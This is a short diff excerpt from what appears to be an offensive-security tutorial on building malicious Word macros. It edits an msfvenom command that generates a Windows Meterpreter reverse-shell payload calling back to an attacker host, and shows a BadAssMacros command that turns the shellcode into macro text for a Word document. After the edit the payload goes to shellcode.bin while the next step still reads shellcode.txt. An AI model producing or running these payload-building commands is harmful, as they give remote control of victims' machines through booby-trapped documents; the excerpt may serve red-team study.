@@ -222,7 +222,7 @@ As usual this has been a massive 'from first principles' breakdown in order to c
 The following command provides some sane defaults that will generate the raw text of the VBA Macro which we need to insert into our Word doc. Obviously we will potentially need to adjust these to our use case:
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.x.y LPORT=443 EXITFUNC=thread -f vbapplication > shellcode.txt
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.x.y LPORT=80 EXITFUNC=thread -f raw > shellcode.bin
 ```
 ```powershell
 .\BadAssMacrosx86.exe -i shellcode.txt -w doc -p no -s indirect -c 10 -o macro.txt
